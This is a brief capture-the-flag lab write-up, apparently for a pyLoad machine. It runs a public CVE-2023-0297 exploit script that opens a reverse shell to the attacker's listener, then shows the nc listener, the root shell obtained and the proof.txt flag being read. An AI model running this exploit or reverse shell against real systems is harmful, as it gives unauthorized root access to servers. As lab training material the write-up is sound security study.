参考
 
python3 exploit.py -t [http://192.168.141.26:9666](http://192.168.141.26:9666) -c whoami -P 9001 -I 192.168.45.205
 
liucheng  
[https://github.com/JacobEbben/CVE-2023-0297/tree/main](https://github.com/JacobEbben/CVE-2023-0297/tree/main)   ┌──(kali㉿kali)-[~/Desktop/pg03/pyLoader/CVE-2023-0297]  
└─$ python3 exploit.py -t [http://192.168.141.26:9666](http://192.168.141.26:9666) -c whoami -P 9001 -I 192.168.45.205  
[SUCCESS] Running reverse shell. Check your listener!
    
┌──(kali㉿kali)-[~/Desktop/pg03/pyLoader/CVE-2023-0297]  
└─$ rlwrap -cAr nc -nvlp9001  
listening on [any] 9001 ...  
connect to [192.168.45.205] from (UNKNOWN) [192.168.141.26] 38402  
bash: cannot set terminal process group (902): Inappropriate ioctl for device  
bash: no job control in this shell  
root@pyloader:~/.pyload/data# cd /root  
cd /root  
root@pyloader:~# ls  
ls  
Downloads  
email5.txt  
proof.txt  
snap  
root@pyloader:~# cat proof.txt  
cat proof.txt  
765ce73b16a97e9cf4f31da49ad23cfc  
root@pyloader:~#